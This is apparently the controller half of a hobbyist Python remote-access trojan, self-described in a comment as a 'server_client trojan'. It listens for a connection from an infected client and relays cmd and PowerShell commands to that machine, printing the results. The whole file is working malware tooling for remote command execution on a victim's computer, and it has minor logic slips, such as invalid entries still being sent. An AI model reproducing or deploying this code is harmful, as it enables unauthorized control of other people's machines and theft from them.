import socket, os


base_encoding = "utf-8"


def clear():
    import os
    os.system("clear")


clear()
# print("Welcome to the server_client trojan by Kn0rX!")

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((input("Host to bind on:"), int(input("Port to bind on:"))))
server_socket.listen(1)
print("Waiting for server_socket...")
client_socket, address = server_socket.accept()
connected = True
print(f"Successfully established server_socket with {str(address)}!")


def get_client_output():
    global connected
    try:
        client_response = client_socket.recv(9999)
    except (ConnectionRefusedError, ConnectionAbortedError):
        connected = False
    else:
        if client_response:
            client_response = client_response.decode(base_encoding)
            client_response = str(client_response)
            return client_response
        else:
            return False


def send_command():
    global connected
    global command

    try:
        client_socket.send(command.encode(base_encoding))
    except (ConnectionRefusedError, ConnectionAbortedError):
        connected = False

    output = get_client_output()
    if not output:
        connected = False
    else:
        print(output)


if __name__ == '__main__':
    while True:
        command = input("cmd-command:")
        if command == "exit":
            client_socket.close()
            server_socket.close()
            break
        elif command in ["cls", "clear"]:
            clear()
            continue
        elif command.strip() == "powershell":
            while True:
                command = input("powershell-command: ")
                if command == "exit":
                    break
                if command == "cls" or command == "clear":
                    os.system("cls")
                    continue
                command = "powershell (" + command + ")"
                send_command()
        else:
            print("Invalid entry!")
        send_command()
